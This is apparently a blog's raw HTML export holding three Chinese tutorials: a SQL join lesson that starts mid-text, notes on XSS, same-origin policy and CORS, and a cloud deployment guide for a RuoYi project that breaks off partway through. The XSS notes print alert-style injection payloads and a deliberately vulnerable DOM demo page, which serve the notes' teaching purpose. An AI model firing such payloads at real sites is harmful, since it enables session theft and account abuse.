class="keyword">SELECT</span> employees.employee_id, employees.last_name,</span><br><span class="line">employees.department_id, departments.department_id,</span><br><span class="line">departments.location_id</span><br><span class="line"><span class="keyword">FROM</span> employees, departments</span><br><span class="line"><span class="keyword">WHERE</span> employees.department_id <span class="operator">=</span> departments.department_id;</span><br></pre></td></tr></table></figure><p><img src="https://static.luozhinet.com/f6/1946302b2ef60eab5ee1d95c8bc5bd" alt="image"></p><p>拓展1：多个连接条件与 AND 操作符</p><p><img src="https://static.luozhinet.com/b0/b6c7c8d3dcfac4e1e067b6b9232740" alt="image"></p><p>拓展2：区分重复的列名</p><ul><li><p>多个表中有相同列时，必须在列名之前加上表名前缀。</p></li><li><p>在不同表中具有相同列名的列可以用 表名 加以区分。</p></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> employees.last_name, departments.department_name,employees.department_id</span><br><span class="line"><span class="keyword">FROM</span> employees, departments</span><br><span class="line"><span class="keyword">WHERE</span> employees.department_id <span class="operator">=</span> departments.department_id;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>拓展3：表的别名</p><ul><li><p>使用别名可以简化查询。</p></li><li><p>列名前使用表名前缀可以提高查询效率。</p></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> e.employee_id, e.last_name, e.department_id,</span><br><span class="line">d.department_id, d.location_id</span><br><span class="line"><span class="keyword">FROM</span> employees e , departments d</span><br><span class="line"><span class="keyword">WHERE</span> e.department_id <span class="operator">=</span> d.department_id;</span><br></pre></td></tr></table></figure><blockquote><p>需要注意的是，如果我们使用了表的别名，在查询字段中、过滤条件中就只能使用别名进行代替， 不能使用原有的表名，否则就会报错。</p><p>阿里开发规范 ：</p><p>【 强制 】对于数据库中表记录的查询和变更，只要涉及多个表，都需要在列名前加表的别名（或 表名）进行限定。</p><p>说明 ：对多表进行查询记录、更新记录、删除记录时，如果对操作列没有限定表的别名（或表 名），并且操作列在多个表中存在时，就会抛异常。</p><p>正例 ：select t1.name from table_first as t1 , table_second as t2 where t1.id&#x3D;t2.id;</p><p>反例 ：在某业务中，由于多表关联查询语句没有加表的别名（或表名）的限制，正常运行两年 后，最近在 某个表中增加一个同名字段，在预发布环境做数据库变更后，线上查询语句出现出 1052 异常：Column ‘name’ in field list is ambiguous。</p></blockquote><p>拓展4：连接多个表</p><p><img src="https://static.luozhinet.com/60/cb1723f490b74fdfc5fa232c61c279" alt="image"></p><p>总结：连接 n个表,至少需要n-1个连接条件。比如，连接三个表，至少需要两个连接条件。</p><p>练习：查询出公司员工的 last_name,department_name, city</p><h4 id="非等值连接"><a href="#非等值连接" class="headerlink" title="非等值连接"></a>非等值连接</h4><p><img src="https://static.luozhinet.com/fa/bf7d5e4ddeb5809521d566f4bc8cae" alt="image"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> e.last_name, e.salary, j.grade_level</span><br><span class="line"><span class="keyword">FROM</span> employees e, job_grades j</span><br><span class="line"><span class="keyword">WHERE</span> e.salary <span class="keyword">BETWEEN</span> j.lowest_sal <span class="keyword">AND</span> j.highest_sal;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://static.luozhinet.com/32/d3b978fa3a3061f1265607229f6781" alt="image"></p><h3 id="分类2：自连接-vs-非自连接"><a href="#分类2：自连接-vs-非自连接" class="headerlink" title="分类2：自连接 vs 非自连接"></a>分类2：自连接 vs 非自连接</h3><p><img src="https://static.luozhinet.com/3b/b839df02ffa75962343ab7a3a33467" alt="image"></p><ul><li>当table1和table2本质上是同一张表，只是用取别名的方式虚拟成两张表以代表不同的意义。然后两 个表再进行内连接，外连接等查询。</li></ul><p>题目：查询employees表，返回“Xxx works for Xxx”</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> CONCAT(worker.last_name ,<span class="string">&#x27; works for &#x27;</span></span><br><span class="line">, manager.last_name)</span><br><span class="line"><span class="keyword">FROM</span> employees worker, employees manager</span><br><span class="line"><span class="keyword">WHERE</span> worker.manager_id <span class="operator">=</span> manager.employee_id ;</span><br></pre></td></tr></table></figure><p><img src="https://static.luozhinet.com/0a/8291e107ca040fa94d964b956eadc6" alt="image"></p><p>练习：查询出last_name为 ‘Chen’ 的员工的 manager 的信息。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#<span class="number">7.2</span>  自连接     VS   非自连接</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> employees;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#练习：查询员工姓名及其管理者的id和姓名[<span class="keyword">SQL</span>] <span class="keyword">SELECT</span> emp.employee_id,last_name,employee_id,last_name</span><br><span class="line"><span class="keyword">from</span> employees emp,employees mgr</span><br><span class="line"><span class="keyword">WHERE</span> emp.manager_id <span class="operator">=</span> mgr.employee_id;</span><br><span class="line">[Err] <span class="number">1052</span> <span class="operator">-</span> <span class="keyword">Column</span> <span class="string">&#x27;last_name&#x27;</span> <span class="keyword">in</span> field list <span class="keyword">is</span> ambiguous</span><br><span class="line"></span><br><span class="line">#正确</span><br><span class="line"><span class="keyword">SELECT</span> emp.employee_id,emp.last_name,mgr.employee_id,mgr.last_name</span><br><span class="line"><span class="keyword">from</span> employees emp,employees mgr</span><br><span class="line"><span class="keyword">WHERE</span> emp.manager_id <span class="operator">=</span> mgr.employee_id;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#MySQL中</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[<span class="keyword">SQL</span>] <span class="keyword">SELECT</span> e.last_name,d.department_name</span><br><span class="line"><span class="keyword">FROM</span> employees e,departments d</span><br><span class="line"><span class="keyword">WHERE</span> e.department_id <span class="operator">=</span> d.department_id(<span class="operator">+</span>);</span><br><span class="line">[Err] <span class="number">1064</span> <span class="operator">-</span> You have an error <span class="keyword">in</span> your <span class="keyword">SQL</span> syntax; <span class="keyword">check</span> the manual that corresponds <span class="keyword">to</span> your MySQL server version <span class="keyword">for</span> the <span class="keyword">right</span> syntax <span class="keyword">to</span> use near <span class="string">&#x27;)&#x27;</span> <span class="keyword">at</span> line <span class="number">3</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://static.luozhinet.com/9f/023ff3835084ef7a723331c5959ef2" alt="image"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[<span class="keyword">SQL</span>] #满外连接： MySQl不支持<span class="keyword">FULL</span> <span class="keyword">OUTER</span> <span class="keyword">JOIN</span></span><br><span class="line"><span class="keyword">SELECT</span> e.last_name,d.department_name</span><br><span class="line"><span class="keyword">FROM</span> employees e <span class="keyword">FULL</span> <span class="keyword">OUTER</span> <span class="keyword">JOIN</span> departments d</span><br><span class="line"><span class="keyword">ON</span> e.department_id <span class="operator">=</span> d.department_id;</span><br><span class="line">[Err] <span class="number">1064</span> <span class="operator">-</span> You have an error <span class="keyword">in</span> your <span class="keyword">SQL</span> syntax; <span class="keyword">check</span> the manual that corresponds <span class="keyword">to</span> your MySQL server version <span class="keyword">for</span> the <span class="keyword">right</span> syntax <span class="keyword">to</span> use near <span class="string">&#x27;FULL OUTER JOIN departments d</span></span><br><span class="line"><span class="string">ON e.department_id = d.department_id&#x27;</span> <span class="keyword">at</span> line <span class="number">3</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="分类3：内连接-vs-外连接"><a href="#分类3：内连接-vs-外连接" class="headerlink" title="分类3：内连接 vs 外连接"></a>分类3：内连接 vs 外连接</h3><p>除了查询满足条件的记录以外，外连接还可以查询某一方不满足条件的记录。</p><p><img src="https://static.luozhinet.com/c4/3b2c2538cb1d830f4156e4f88bfb49" alt="image"></p><ul><li><p>内连接: 合并具有同一列的两个以上的表的行, 结果集中不包含一个表与另一个表不匹配的行</p></li><li><p>外连接: 两个表在连接过程中除了返回满足连接条件的行以外还返回左（或右）表中不满足条件的 行 ，这种连接称为左（或右） 外连接。没有匹配的行时, 结果表中相应的列为空(NULL)。</p></li><li><p>如果是左外连接，则连接条件中左边的表也称为 主表 ，右边的表称为 从表 。</p><p>如果是右外连接，则连接条件中右边的表也称为 主表 ，左边的表称为 从表 。</p></li></ul><h4 id="SQL92：使用-创建连接"><a href="#SQL92：使用-创建连接" class="headerlink" title="SQL92：使用(+)创建连接"></a>SQL92：使用(+)创建连接</h4><ul><li><p>在 SQL92 中采用（+）代表从表所在的位置。即左或右外连接中，(+) 表示哪个是从表。</p></li><li><p>Oracle 对 SQL92 支持较好，而 MySQL 则不支持 SQL92 的外连接。</p></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#左外连接</span><br><span class="line"><span class="keyword">SELECT</span> last_name,department_name</span><br><span class="line"><span class="keyword">FROM</span> employees ,departments</span><br><span class="line"><span class="keyword">WHERE</span> employees.department_id <span class="operator">=</span> departments.department_id(<span class="operator">+</span>);</span><br><span class="line">#右外连接</span><br><span class="line"><span class="keyword">SELECT</span> last_name,department_name</span><br><span class="line"><span class="keyword">FROM</span> employees ,departments</span><br><span class="line"><span class="keyword">WHERE</span> employees.department_id(<span class="operator">+</span>) <span class="operator">=</span> departments.department_id;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>而且在 SQL92 中，只有左外连接和右外连接，没有满（或全）外连接。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 操作 </tag>
            
            <tag> 对象 </tag>
            
            <tag> 个数 </tag>
            
            <tag> 运算 </tag>
            
            <tag> 分类 </tag>
            
            <tag> select </tag>
            
            <tag> 查询 </tag>
            
            <tag> 错误 </tag>
            
            <tag> list </tag>
            
            <tag> 公司 </tag>
            
            <tag> 开发 </tag>
            
            <tag> ment </tag>
            
            <tag> part </tag>
            
            <tag> employees </tag>
            
            <tag> 连接 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web安全学习笔记 XSS上</title>
      <link href="/posts/a76afeaaf8b6/"/>
      <url>/posts/a76afeaaf8b6/</url>
      
        <content type="html"><![CDATA[<p>Web安全学习笔记 XSS上</p><blockquote><p>繁枝插云欣 <strong>——ICML8</strong></p></blockquote><hr><ol><li>XSS的分类和基本认识</li><li>XSS的危害</li><li>同源策略的基本认识</li></ol><hr><h1 id="一-XSS的分类和基本认识"><a href="#一-XSS的分类和基本认识" class="headerlink" title="一.XSS的分类和基本认识"></a>一.XSS的分类和基本认识</h1><h2 id="1-简介"><a href="#1-简介" class="headerlink" title="1. 简介"></a>1. 简介</h2><p>XSS全称为<code>Cross Site Scripting</code>，为了和CSS分开简写为XSS，中文名为<code>跨站脚本</code>。该漏洞发生在<code>用户端</code>，是指在<code>渲染过程中发生了不在预期过程中的JavaScript代码执行</code>。XSS通常被用于<code>获取Cookie</code>、<code>以受攻击者的身份进行操作</code>等行为。</p><h2 id="2-分类"><a href="#2-分类" class="headerlink" title="2. 分类"></a>2. 分类</h2><p>1.反射型XSS</p><p>反射型XSS是比较常见和广泛的一类，举例来说，当一个网站的代码中包含类似下面的语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php echo &quot;&lt;p&gt;hello, $_GET[&#x27;user&#x27;]&lt;/p&gt;&quot;;?&gt; </span><br></pre></td></tr></table></figure><p>那么在访问时设置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?user=&lt;/p&gt;&lt;script&gt;alert(&quot;hack&quot;)&lt;/script&gt;&lt;p&gt;</span><br></pre></td></tr></table></figure><p>则可执行预设好的JavaScript代码。</p><p><code>反射型XSS通常出现在搜索等功能中，需要被攻击者点击对应的链接才能触发，且受到XSS Auditor、NoScript等防御手段的影响较大。</code></p><p>2.储存型XSS</p><p>储存型XSS相比反射型来说危害较大，在这种漏洞中，攻击者能够把<code>攻击载荷存入服务器的数据库中，造成持久化的攻击</code>。</p><p>3.DOM XSS</p><p>DOM型XSS不同之处在于DOM型XSS<code>一般和服务器的解析响应没有直接关系</code>，而是<code>在JavaScript脚本动态执行的过程中产生的</code>。</p><p>例如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;&lt;head&gt;&lt;title&gt;DOM Based XSS Demo&lt;/title&gt;&lt;script&gt;function xsstest()&#123;    var str = document.getElementById(&quot;input&quot;).value;    document.getElementById(&quot;output&quot;).innerHTML = &quot;&lt;img src=&#x27;&quot;+str+&quot;&#x27;&gt;&lt;/img&gt;&quot;;&#125;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div id=&quot;output&quot;&gt;&lt;/div&gt;&lt;input type=&quot;text&quot; id=&quot;input&quot; size=50 value=&quot;&quot; /&gt;&lt;input type=&quot;button&quot; value=&quot;submit&quot; onclick=&quot;xsstest()&quot; /&gt;&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x&#x27; onerror=&#x27;javascript:alert(/xss/)</span><br></pre></td></tr></table></figure><p>即可触发</p><p>4.Blind XSS</p><p>Blind XSS是储存型XSS的一种，它保存在某些存储中，<code>当一个“受害者”访问这个页面时执行，并且在文档对象模型(DOM)中呈现payload。</code> 它被称为Blind的原因是因为它通常发生在通常不暴露给用户的功能上。</p><hr><h1 id="二-XSS的危害"><a href="#二-XSS的危害" class="headerlink" title="二.XSS的危害"></a>二.XSS的危害</h1><p>存在XSS漏洞时，可能会导致以下几种情况：</p><p>1.用户的<code>Cookie</code>被获取，其中可能存在<code>Session ID</code>等敏感信息。</p><p>若服务器端没有做相应防护，攻击者可用对应<code>Cookie</code>登陆服务器。</p><p>2.攻击者能够在一定限度内记录用户的键盘输入。</p><p>3.攻击者通过<code>CSRF</code>等方式以用户身份执行危险操作。</p><p>4.XSS蠕虫。</p><p>5.获取用户浏览器信息。</p><p>6.利用XSS漏洞扫描用户内网。</p><hr><h1 id="三-同源策略的基本认识"><a href="#三-同源策略的基本认识" class="headerlink" title="三.同源策略的基本认识"></a>三.同源策略的基本认识</h1><hr><h2 id="1-简介-1"><a href="#1-简介-1" class="headerlink" title="1. 简介"></a>1. 简介</h2><p>同源策略限制了不同源之间如何进行资源交互，是用于隔离潜在恶意文件的重要安全机制。 是否同源由<code>URL</code>决定，<code>URL由协议、域名、端口和路径组成，如果两个URL的协议、域名和端口相同，则表示他们同源。</code></p><h3 id="1-1-file域的同源策略"><a href="#1-1-file域的同源策略" class="headerlink" title="1.1. file域的同源策略"></a>1.1. file域的同源策略</h3><p>在之前的浏览器中，任意两个file域的URI被认为是同源的。本地磁盘上的任何HTML文件都可以读取本地磁盘上的任何其他文件。</p><p>从Gecko 1.9开始，文件使用了更细致的同源策略，只有当源文件的父目录是目标文件的祖先目录时，文件才能读取另一个文件。</p><h3 id="1-2-cookie的同源策略"><a href="#1-2-cookie的同源策略" class="headerlink" title="1.2. cookie的同源策略"></a>1.2. cookie的同源策略</h3><p>cookie使用不同的源定义方式，一个页面可以为本域和任何父域设置cookie，只要是父域不是公共后缀(<code>public suffix</code>)即可。</p><p>不管使用哪个协议(<code>HTTP/HTTPS</code>)或端口号，浏览器都允许给定的域以及其任何子域名访问cookie。设置 cookie时，可以使用 <code>domain / path / secure 和 http-only 标记来限定其访问性。</code></p><p>所以 <code>https://localhost:8080</code>&#x2F; 和 <code>http://localhost:8081</code>&#x2F; 的Cookie是共享的。</p><h3 id="1-3-Flash-x2F-SilverLight跨域"><a href="#1-3-Flash-x2F-SilverLight跨域" class="headerlink" title="1.3. Flash&#x2F;SilverLight跨域"></a>1.3. Flash&#x2F;SilverLight跨域</h3><p>浏览器的各种插件也存在跨域需求。</p><p>通常是通过在服务器配置<code>crossdomain.xml</code></p><p>设置本服务允许哪些域名的跨域访问</p><p>客户端会请求此文件，如果发现自己的域名在访问列表里，就发起真正的请求，否则不发送请求。</p><h2 id="2-源的更改"><a href="#2-源的更改" class="headerlink" title="2. 源的更改"></a>2. 源的更改</h2><p>同源策略认为域和子域属于不同的域，例如 <code>child1.a.com</code> 与<code>a.com</code>&#x2F; <code>child1.a.com</code> 与 <code>child2.a.com</code> &#x2F; <code>xxx.child1.a.com</code> 与 <code>child1.a.com</code> 两两不同源。</p><p>对于这种情况，可以在两个方面各自设置 <code>document.domain=&#39;a.com&#39;</code> 来改变其源来实现以上任意两个页面之间的通信。</p><p>另外因为浏览器单独保存端口号，这种赋值会导致端口号被重写为 <code>null</code> 。</p><hr><h2 id="3-跨源访问"><a href="#3-跨源访问" class="headerlink" title="3. 跨源访问"></a>3. 跨源访问</h2><p>同源策略控制了不同源之间的交互，这些交互通常分为三类：</p><p>1.通常允许跨域写操作(Cross-origin writes)</p><p><code>链接(links)</code></p><p><code>重定向</code></p><p><code>表单提交</code></p><p>2.通常允许跨域资源嵌入(Cross-origin embedding)</p><p>3.通常不允许跨域读操作(Cross-origin reads)</p><p>可能嵌入跨源的资源的一些示例有：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;...&quot;&gt;&lt;/script&gt; 标签嵌入跨域脚本语法错误信息只能在同源脚本中捕捉到</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=&quot;stylesheet&quot; href=&quot;...&quot;&gt; 标签嵌入CSS由于CSS的松散的语法规则CSS的跨域需要一个设置正确的Content-Type 消息头</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img&gt; / &lt;video&gt; / &lt;audio&gt; 嵌入多媒体资源。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;object&gt; &lt;embed&gt; 和 &lt;applet&gt; 的插件。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@font-face 引入的字体一些浏览器允许跨域字体( cross-origin fonts)一些需要同源字体(same-origin fonts)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;frame&gt; 和 &lt;iframe&gt; 载入的任何资源站点可以使用X-Frame-Options消息头来阻止这种形式的跨域交互</span><br></pre></td></tr></table></figure><h3 id="3-1-JSONP跨域"><a href="#3-1-JSONP跨域" class="headerlink" title="3.1. JSONP跨域"></a>3.1. JSONP跨域</h3><p>JSONP就是利用 <code>&lt;script&gt;</code> 标签的跨域能力实现跨域数据的访问，请求动态生成的JavaScript脚本同时带一个callback函数名作为参数。</p><p>服务端收到请求后，动态生成脚本产生数据，并在代码中以产生的数据为参数调用callback函数。</p><p>JSONP也存在一些安全问题，例如当对传入&#x2F;传回参数没有做校验就直接执行返回的时候，会造成XSS问题。没有做Referer或Token校验就给出数据的时候，可能会造成数据泄露。</p><p>另外JSONP在没有设置callback函数的白名单情况下，可以合法的做一些设计之外的函数调用，引入问题。这种攻击也被称为SOME攻击。</p><h3 id="3-2-跨源脚本API访问"><a href="#3-2-跨源脚本API访问" class="headerlink" title="3.2. 跨源脚本API访问"></a>3.2. 跨源脚本API访问</h3><p>Javascript的APIs中，如 <code>iframe.contentWindow</code> , <code>window.parent</code> , <code>window.open</code> 和 <code>window.opener</code> 允许文档间相互引用。当两个文档的源不同时，这些引用方式将对 <code>window</code> 和 <code>location</code> 对象的访问添加限制。</p><p><code>window</code> 允许跨源访问的方法有</p><p>window.blur window.close window.focus window.postMessage</p><p><code>window</code> 允许跨源访问的属性有</p><p>window.closed window.frames window.length window.location window.opener window.parent window.self window.top window.window</p><p>其中 <code>window.location</code> 允许读&#x2F;写，其他的属性只允许读</p><h3 id="3-跨源数据存储访问"><a href="#3-跨源数据存储访问" class="headerlink" title="3. 跨源数据存储访问"></a>3. 跨源数据存储访问</h3><p>存储在浏览器中的数据，如 <code>localStorage</code> 和 <code>IndexedDB</code> ，以源进行分割。每个源都拥有自己单独的存储空间，一个源中的Javascript脚本不能对属于其它源的数据进行读写操作。</p><hr><h2 id="4-CORS"><a href="#4-CORS" class="headerlink" title="4. CORS"></a>4. CORS</h2><p>CORS是一个W3C标准，全称是跨域资源共享(Cross-origin resource sharing)。通过这个标准，可以允许浏览器读取跨域的资源。</p><h3 id="4-1-常见请求头"><a href="#4-1-常见请求头" class="headerlink" title="4.1. 常见请求头"></a>4.1. 常见请求头</h3><p>Origin</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">预检请求或实际请求的源站URI,浏览器请求默认会发送该字段Origin: &lt;origin&gt;</span><br></pre></td></tr></table></figure><p>Access-Control-Request-Method</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">声明请求使用的方法Access-Control-Request-Method: &lt;method&gt;</span><br></pre></td></tr></table></figure><p>Access-Control-Request-Headers</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">声明请求使用的header字段Access-Control-Request-Headers: &lt;field-name&gt;[, &lt;field-name&gt;]*</span><br></pre></td></tr></table></figure><h3 id="4-2-常见返回头"><a href="#4-2-常见返回头" class="headerlink" title="4.2. 常见返回头"></a>4.2. 常见返回头</h3><p>Access-Control-Allow-Origin</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">声明允许访问的源外域URI对于携带身份凭证的请求不可使用通配符 *Access-Control-Allow-Origin: &lt;origin&gt; | *</span><br></pre></td></tr></table></figure><p>Access-Control-Expose-Headers</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">声明允许暴露的头e.g. Access-Control-Expose-Headers: X-My-Custom-Header, X-Another-Custom-Header</span><br></pre></td></tr></table></figure><p>Access-Control-Max-Age</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">声明Cache时间Access-Control-Max-Age: &lt;delta-seconds&gt;</span><br></pre></td></tr></table></figure><p>Access-Control-Allow-Credentials</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">声明是否允许在请求中带入Access-Control-Allow-Credentials: true</span><br></pre></td></tr></table></figure><p>Access-Control-Allow-Methods</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">声明允许的访问方式Access-Control-Allow-Methods: &lt;method&gt;[, &lt;method&gt;]*</span><br></pre></td></tr></table></figure><p>Access-Control-Allow-Headers</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">声明允许的头Access-Control-Allow-Headers: &lt;field-name&gt;[, &lt;field-name&gt;]*</span><br></pre></td></tr></table></figure><h3 id="4-3-防御建议"><a href="#4-3-防御建议" class="headerlink" title="4.3. 防御建议"></a>4.3. 防御建议</h3><p>如非必要不开启CORS 定义详细的白名单，不使用通配符，仅配置所需要的头 配置 <code>Vary: Origin</code> 头部 如非必要不使用 <code>Access-Control-Allow-Credentials</code> 限制缓存的时间</p><hr><h1 id="5-阻止跨源访问"><a href="#5-阻止跨源访问" class="headerlink" title="5. 阻止跨源访问"></a>5. 阻止跨源访问</h1><p>阻止跨域写操作，可以检测请求中的 <code>CSRF token</code></p><p>这个标记被称为Cross-Site Request Forgery (CSRF) 标记。</p><p>阻止资源的跨站读取，因为嵌入资源通常会暴露信息，需要保证资源是不可嵌入</p><p>的。但是多数情况下浏览器都不会遵守 <code>Content-Type</code> 消息头</p><p>例如如果在HTML文档中指定 <code>&lt;script&gt;</code> 标记</p><p>则浏览器会尝试将HTML解析为JavaScript</p><hr>]]></content>
      
      
      <categories>
          
          <category> 技术教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 操作 </tag>
            
            <tag> xss </tag>
            
            <tag> 分类 </tag>
            
            <tag> 反射 </tag>
            
            <tag> 云欣 </tag>
            
            <tag> 认识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>云服务器部署前后端分离项目（若依）详细教程</title>
      <link href="/posts/93f4c35cf675/"/>
      <url>/posts/93f4c35cf675/</url>
      
        <content type="html"><![CDATA[<p>镜像下载、域名解析、时间同步请点击 <a href="https://developer.aliyun.com/mirror/?utm_content=g_1000303593">阿里云开源镜像站</a></p><p>第一次在Linux云服务器上部署前后端分离项目，查了很多资料和视频，踩了许多坑。成功实现部署若依的前后端分离项目后，想记录一下前后端部署的过程，供学习的小伙伴参考。</p><h3 id="1-环境准备"><a href="#1-环境准备" class="headerlink" title="1.环境准备"></a>1.环境准备</h3><p>一定要在开始前先准备好以下工具和环境（可以上网查找安装的方法），后续还会对其进行修改：</p><ul><li>购买一个云服务器，例如阿里云等等，操作系统为Linux centos7.x</li><li>在云服务器上安装Nodejs（之前的博客有安装方法）</li><li>在云服务器上安装Nginx</li><li>在云服务器上安装jdk1.8+（推荐1.8）</li><li>在云服务器上安装mysqk5.7+（推荐5.7）</li><li>在云服务器上安装redis</li><li>远程连接工具xshell或者finalshell</li></ul><h3 id="2-下载前后端项目"><a href="#2-下载前后端项目" class="headerlink" title="2.下载前后端项目"></a>2.下载前后端项目</h3><p>若依前后端项目地址：<a href="https://gitee.com/y_project/RuoYi">https://gitee.com/y_project&#x2F;RuoYi</a></p><p>若依前后端项目使用手册地址：<br><a href="http://doc.ruoyi.vip/ruoyi/">http://doc.ruoyi.vip/ruoyi/</a></p><p>进入网址将项目下载或者git clone到本地并解压:</p><p><img src="https://static.luozhinet.com/79/71b024e82f035281aea142abea8582" alt="file"></p><p>在这个项目中，ruoyi-ui文件夹是前端项目，其余为后端项目，我们接下来需要分开打包部署。</p><p><img src="https://static.luozhinet.com/f8/22bfb59c30828950b3b7612225fc93" alt="file"></p><h3 id="3-远程连接服务器"><a href="#3-远程连接服务器" class="headerlink" title="3.远程连接服务器"></a>3.远程连接服务器</h3><p>通过xshell或者FinalShell远程连接服务器，连接指令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh user@ip</span><br></pre></td></tr></table></figure><p>user为服务器的用户名，一般为root，ip是服务器的ip<br>,默认端口号为22，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh root@172.12.134.12</span><br></pre></td></tr></table></figure><p>如果连接失败可能是服务器没有开启远程连接许可或者端口等等，可以搜寻相关方法解决。</p><h3 id="4-前端部署"><a href="#4-前端部署" class="headerlink" title="4.前端部署"></a>4.前端部署</h3><p>（1）首先将项目中ruoyi-ui这个文件夹上传至服务器，可以用FinalShell的文件管理功能，也可以用服务器管理的上传文件功能，例如宝塔界面里的文件管理：</p><p><img src="https://static.luozhinet.com/d1/3f87029e847e2ed3341ad4a7da6ee0" alt="file"></p><p>可以专门建一个目录存储它们，例如在根目录下创建了一个project文件夹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /</span><br><span class="line">mkdir project</span><br></pre></td></tr></table></figure><p><img src="https://static.luozhinet.com/0b/ef905a84a2d5fb5a7be559cd120221" alt="file"></p><p>（2）依次输入如下命令，进入ruoyi-ui文件夹，并对前端代码进行打包,生成一个dist文件夹，这就是前端代码打包后的文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 